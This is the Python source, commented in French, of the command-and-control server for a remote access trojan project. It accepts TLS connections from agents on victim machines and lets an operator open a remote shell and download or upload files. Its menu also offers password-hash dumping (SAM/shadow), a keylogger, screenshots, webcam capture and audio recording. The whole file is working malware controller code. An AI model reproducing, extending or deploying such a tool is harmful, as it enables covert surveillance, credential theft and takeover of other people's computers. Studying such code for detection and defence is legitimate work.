"""
Serveur RAT - Remote Administration Tool.

Écoute les connexions entrantes des agents via une socket TCP chiffrée TLS.
Supporte plusieurs agents en parallèle grâce aux threads.
Interface interactive en ligne de commande pour piloter les agents.
"""

import socket
import threading
import time
from typing import Any

from rat_project.common.protocol import decode_message, encode_message
from rat_project.common.tls import create_server_ssl_context
from rat_project.utils.logger_config import setup_logger

HOST = "0.0.0.0"
PORT = 8888

logger = setup_logger("server")

# Dictionnaire des sessions actives : {session_id: {conn, ip, port, hostname, os, release}}
sessions: dict[int, dict[str, Any]] = {}
session_lock = threading.Lock()
session_counter = 0


# ---------------------------------------------------------------------------
# Gestion des sessions
# ---------------------------------------------------------------------------


def register_session(conn: socket.socket, addr: tuple[str, int], payload: dict[str, Any]) -> int:
    """
    Enregistre un nouvel agent dans le dictionnaire des sessions.

    Args:
        conn: Socket TLS de l'agent.
        addr: Tuple (ip, port) de l'agent.
        payload: Dictionnaire d'enregistrement envoyé par l'agent.

    Returns:
        int: Identifiant unique de la session créée.
    """
    global session_counter

    with session_lock:
        session_counter += 1
        session_id = session_counter
        sessions[session_id] = {
            "conn": conn,
            "ip": addr[0],
            "port": addr[1],
            "hostname": payload.get("hostname", "unknown"),
            "os": payload.get("os", "unknown"),
            "release": payload.get("release", "unknown"),
        }

    logger.info(
        "Session %s enregistrée : %s:%s | %s | %s %s",
        session_id,
        addr[0],
        addr[1],
        payload.get("hostname", "unknown"),
        payload.get("os", "unknown"),
        payload.get("release", "unknown"),
    )
    return session_id


def remove_session(session_id: int) -> None:
    """
    Supprime une session du dictionnaire des sessions actives.

    Args:
        session_id: Identifiant de la session à supprimer.
    """
    with session_lock:
        if session_id in sessions:
            del sessions[session_id]
            logger.info("Session %s supprimée", session_id)


def get_session(session_id: int) -> dict[str, Any] | None:
    """
    Récupère les données d'une session par son identifiant.

    Args:
        session_id: Identifiant de la session.

    Returns:
        dict ou None si la session n'existe pas.
    """
    with session_lock:
        return sessions.get(session_id)


def print_sessions() -> None:
    """Affiche la liste des sessions actives dans la console."""
    with session_lock:
        if not sessions:
            print("[*] Aucun agent connecté.")
            return

        print("[*] Sessions actives :")
        for sid, data in sessions.items():
            print(
                f"    Agent {sid} | {data['ip']}:{data['port']} "
                f"| {data['hostname']} | {data['os']} {data['release']}"
            )


# ---------------------------------------------------------------------------
# Gestion des connexions entrantes
# ---------------------------------------------------------------------------


def handle_client(conn: socket.socket, addr: tuple[str, int]) -> None:
    """
    Gère la connexion d'un agent depuis un thread dédié.

    Attend le message d'enregistrement, crée la session,
    puis garde la connexion ouverte jusqu'à déconnexion.

    Args:
        conn: Socket TLS de l'agent.
        addr: Tuple (ip, port) de l'agent.
    """
    session_id = None

    try:
        logger.info("Connexion entrante de %s:%s", addr[0], addr[1])

        # Premier message : enregistrement obligatoire
        data = conn.recv(4096)
        if not data:
            logger.warning("Données vides reçues de %s:%s", addr[0], addr[1])
            return

        payload = decode_message(data.decode("utf-8").strip())

        if payload.get("type") != "register":
            logger.warning("Premier message invalide de %s:%s : %s", addr[0], addr[1], payload)
            conn.sendall(
                encode_message({"type": "error", "message": "Le premier message doit être 'register'"})
            )
            return

        session_id = register_session(conn, addr, payload)
        print(f"\n[+] Agent {session_id} connecté ({addr[0]} | {payload.get('hostname', '?')})")
        print("rat > ", end="", flush=True)

        # Accusé de réception à l'agent
        conn.sendall(
            encode_message(
                {
                    "type": "ack",
                    "message": f"session {session_id} enregistrée",
                    "session_id": session_id,
                }
            )
        )

        # Maintenir la connexion ouverte (les commandes sont envoyées depuis interact_with_session)
        while get_session(session_id) is not None:
            time.sleep(0.2)

    except Exception as exc:
        logger.exception("Erreur avec l'agent %s:%s : %s", addr[0], addr[1], exc)

    finally:
        if session_id is not None:
            remove_session(session_id)
            print(f"\n[-] Agent {session_id} déconnecté")
            print("rat > ", end="", flush=True)
        conn.close()
        logger.info("Connexion fermée pour %s:%s", addr[0], addr[1])


def accept_clients(server_socket: socket.socket) -> None:
    """
    Boucle d'acceptation des connexions entrantes (tourne dans un thread daemon).

    Chaque nouvel agent est géré dans un thread séparé.

    Args:
        server_socket: Socket serveur TLS en écoute.
    """
    while True:
        try:
            conn, addr = server_socket.accept()
            logger.info("Nouvelle connexion TLS acceptée de %s:%s", addr[0], addr[1])

            thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
            thread.start()

        except Exception as exc:
            logger.exception("Erreur lors de l'acceptation d'une connexion : %s", exc)


# ---------------------------------------------------------------------------
# Interface interactive agent
# ---------------------------------------------------------------------------


def send_command_and_recv(conn: socket.socket, command: str, extra: dict | None = None) -> dict[str, Any]:
    """
    Envoie une commande à un agent et attend sa réponse.

    Args:
        conn: Socket TLS de l'agent.
        command: Nom de la commande à envoyer.
        extra: Champs supplémentaires à ajouter au message (ex: chemin fichier).

    Returns:
        dict: Réponse de l'agent.
    """
    message: dict[str, Any] = {"type": "command", "command": command}
    if extra:
        message.update(extra)

    conn.sendall(encode_message(message))
    data = conn.recv(65536)
    return decode_message(data.decode("utf-8").strip())


def interact_with_session(session_id: int) -> None:
    """
    Ouvre une session interactive avec un agent.

    Permet d'envoyer des commandes et de recevoir les résultats.
    Tape 'back' pour revenir au menu principal.

    Args:
        session_id: Identifiant de la session cible.
    """
    session = get_session(session_id)

    if session is None:
        print(f"[!] Session {session_id} introuvable.")
        return

    logger.info("Interaction ouverte avec la session %s", session_id)
    conn = session["conn"]

    while True:
        try:
            command = input(f"rat agent {session_id} > ").strip()

            if not command:
                continue

            if command == "back":
                logger.info("Retour au menu principal depuis la session %s", session_id)
                break

            if command == "help":
                print("Commandes disponibles pour l'agent :")
                print("  sysinfo           - Informations système")
                print("  ipconfig          - Configuration réseau")
                print("  screenshot        - Capture d'écran")
                print("  shell             - Shell interactif (bash/cmd)")
                print("  search <nom>      - Rechercher un fichier")
                print("  download <path>   - Télécharger un fichier depuis l'agent")
                print("  upload <path>     - Envoyer un fichier vers l'agent")
                print("  hashdump          - Dump SAM (Windows) ou shadow (Linux)")
                print("  keylogger         - Démarrer/arrêter le keylogger")
                print("  webcam_snapshot   - Photo webcam")
                print("  webcam_stream     - Flux webcam (Ctrl+C pour stopper)")
                print("  record_audio      - Enregistrement audio (5 secondes)")
                print("  back              - Retour au menu principal")
                continue

            # --- Commandes simples (pas de paramètre) ---
            if command in (
                "sysinfo",
                "ipconfig",
                "screenshot",
                "hashdump",
                "keylogger",
                "webcam_snapshot",
                "webcam_stream",
            ):
                response = send_command_and_recv(conn, command)
                _print_response(response)

            # --- record_audio [duration] ---
            elif command == "record_audio" or command.startswith("record_audio "):
                parts = command.split(maxsplit=1)
                duration = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 5
                response = send_command_and_recv(conn, "record_audio", {"duration": duration})
                _save_audio(response)

            # --- Shell interactif ---
            elif command == "shell":
                _shell_session(conn, session_id)

            # --- Recherche fichier ---
            elif command.startswith("search "):
                filename = command.split(maxsplit=1)[1]
                response = send_command_and_recv(conn, "search", {"filename": filename})
                _print_response(response)

            # --- Download (agent → serveur) ---
            elif command.startswith("download "):
                remote_path = command.split(maxsplit=1)[1]
                _download_file(conn, remote_path)

            # --- Upload (serveur → agent) ---
            elif command.startswith("upload "):
                local_path = command.split(maxsplit=1)[1]
                _upload_file(conn, local_path, session_id)

            else:
                logger.warning("Commande agent inconnue : %s", command)
                print("[!] Commande inconnue. Tape 'help'.")

        except KeyboardInterrupt:
            print()
            break
        except Exception as exc:
            logger.exception("Erreur lors de l'interaction avec la session %s : %s", session_id, exc)
            print(f"[!] Erreur : {exc}")
            break


def _print_response(response: dict[str, Any]) -> None:
    """Affiche la sortie d'une réponse agent."""
    output = response.get("output", "")
    error = response.get("error", "")
    data = response.get("data", None)

    if output:
        print(output)
    if error:
        print(f"[!] Erreur agent : {error}")
    if data and not output:
        # Données binaires encodées en base64 (ex: screenshot)
        print(f"[*] Données reçues ({len(data)} octets encodés).")


def _shell_session(conn: socket.socket, session_id: int) -> None:
    """
    Lance un shell interactif avec l'agent.

    Envoie les commandes une par une et affiche le résultat.
    Tape 'exit' pour quitter le shell.

    Args:
        conn: Socket TLS de l'agent.
        session_id: Identifiant de la session (pour les logs).
    """
    print("[*] Shell interactif ouvert. Tape 'exit' pour quitter.")
    conn.sendall(encode_message({"type": "command", "command": "shell_start"}))

    while True:
        try:
            cmd = input("shell > ").strip()
            if cmd == "exit":
                conn.sendall(encode_message({"type": "command", "command": "shell_stop"}))
                break
            if not cmd:
                continue

            conn.sendall(encode_message({"type": "shell_input", "input": cmd}))
            data = conn.recv(65536)
            response = decode_message(data.decode("utf-8").strip())
            print(response.get("output", ""), end="")

        except KeyboardInterrupt:
            conn.sendall(encode_message({"type": "command", "command": "shell_stop"}))
            break


def _download_file(conn: socket.socket, remote_path: str) -> None:
    """
    Télécharge un fichier depuis l'agent vers le serveur.

    Args:
        conn: Socket TLS de l'agent.
        remote_path: Chemin du fichier sur la machine victime.
    """
    import base64
    from pathlib import Path

    conn.sendall(encode_message({"type": "command", "command": "download", "path": remote_path}))
    data = conn.recv(10 * 1024 * 1024)  # 10 MB max
    response = decode_message(data.decode("utf-8").strip())

    if response.get("error"):
        print(f"[!] {response['error']}")
        return

    file_data = base64.b64decode(response["data"])
    filename = Path(remote_path).name
    save_path = Path("downloads") / filename
    save_path.parent.mkdir(exist_ok=True)
    save_path.write_bytes(file_data)
    print(f"[+] Fichier sauvegardé : {save_path} ({len(file_data)} octets)")
    logger.info("Fichier téléchargé : %s → %s", remote_path, save_path)


def _upload_file(conn: socket.socket, local_path: str, session_id: int) -> None:
    """
    Envoie un fichier local vers l'agent.

    Args:
        conn: Socket TLS de l'agent.
        local_path: Chemin local du fichier à envoyer.
        session_id: Identifiant de la session (pour les logs).
    """
    import base64
    from pathlib import Path

    path = Path(local_path)
    if not path.exists():
        print(f"[!] Fichier introuvable : {local_path}")
        return

    file_data = base64.b64encode(path.read_bytes()).decode("utf-8")
    conn.sendall(
        encode_message(
            {
                "type": "command",
                "command": "upload",
                "filename": path.name,
                "data": file_data,
            }
        )
    )

    data = conn.recv(4096)
    response = decode_message(data.decode("utf-8").strip())
    print(response.get("output", "[?] Réponse inattendue"))
    logger.info("Fichier uploadé vers session %s : %s", session_id, local_path)


def _save_audio(response: dict[str, Any]) -> None:
    """
    Decode the base64 WAV data from a record_audio response and save it locally.

    The file is saved in a 'recordings/' folder with a timestamp in the name.

    Args:
        response: Agent response dict containing 'data' (base64 WAV) or 'error'.
    """
    import base64
    import time
    from pathlib import Path

    if response.get("error"):
        print(f"[!] record_audio error: {response['error']}")
        return

    raw_data = response.get("data", "")
    if not raw_data:
        print("[!] No audio data received.")
        return

    wav_bytes = base64.b64decode(raw_data)

    save_dir = Path("recordings")
    save_dir.mkdir(exist_ok=True)

    filename = save_dir / f"audio_{int(time.time())}.wav"
    filename.write_bytes(wav_bytes)

    print(f"[+] Audio saved: {filename} ({len(wav_bytes)} bytes)")
    logger.info("Audio recording saved to %s", filename)


# ---------------------------------------------------------------------------
# Boucle principale du serveur
# ---------------------------------------------------------------------------


def command_loop() -> None:
    """
    Boucle de commandes interactive du serveur.

    Commandes disponibles : help, sessions, interact <id>, exit.
    """
    while True:
        try:
            command = input("rat > ").strip()

            if not command:
                continue

            if command == "help":
                print("Commandes disponibles :")
                print("  help              - Affiche ce menu")
                print("  sessions          - Liste les agents connectés")
                print("  interact <id>     - Interagit avec un agent")
                print("  exit              - Arrête le serveur")

            elif command == "sessions":
                print_sessions()

            elif command.startswith("interact "):
                _, session_id_str = command.split(maxsplit=1)
                if not session_id_str.isdigit():
                    logger.warning("ID de session invalide : %s", session_id_str)
                    print("[!] L'identifiant de session doit être un nombre.")
                    continue
                interact_with_session(int(session_id_str))

            elif command == "exit":
                logger.info("Arrêt du serveur.")
                print("[*] Arrêt du serveur...")
                break

            else:
                logger.warning("Commande serveur inconnue : %s", command)
                print("[!] Commande inconnue. Tape 'help'.")

        except KeyboardInterrupt:
            logger.info("Serveur interrompu par l'utilisateur.")
            print("\n[*] Arrêt du serveur...")
            break
        except Exception as exc:
            logger.exception("Erreur dans la boucle de commandes : %s", exc)
            print(f"[!] Erreur inattendue : {exc}")


def run_server() -> None:
    """
    Point d'entrée du serveur RAT.

    Crée la socket TCP, applique le contexte TLS,
    lance le thread d'acceptation et démarre la boucle interactive.
    """
    ssl_context = create_server_ssl_context()

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as raw_socket:
            raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            raw_socket.bind((HOST, PORT))
            raw_socket.listen(5)

            # Encapsulation TLS de la socket serveur
            with ssl_context.wrap_socket(raw_socket, server_side=True) as server_socket:
                logger.info("Serveur en écoute sur %s:%s (TLS activé)", HOST, PORT)
                print(f"[*] Listening on {PORT}... (TLS)")

                accept_thread = threading.Thread(target=accept_clients, args=(server_socket,), daemon=True)
                accept_thread.start()

                command_loop()

    except Exception as exc:
        logger.exception("Erreur fatale du serveur : %s", exc)


if __name__ == "__main__":
    run_server()
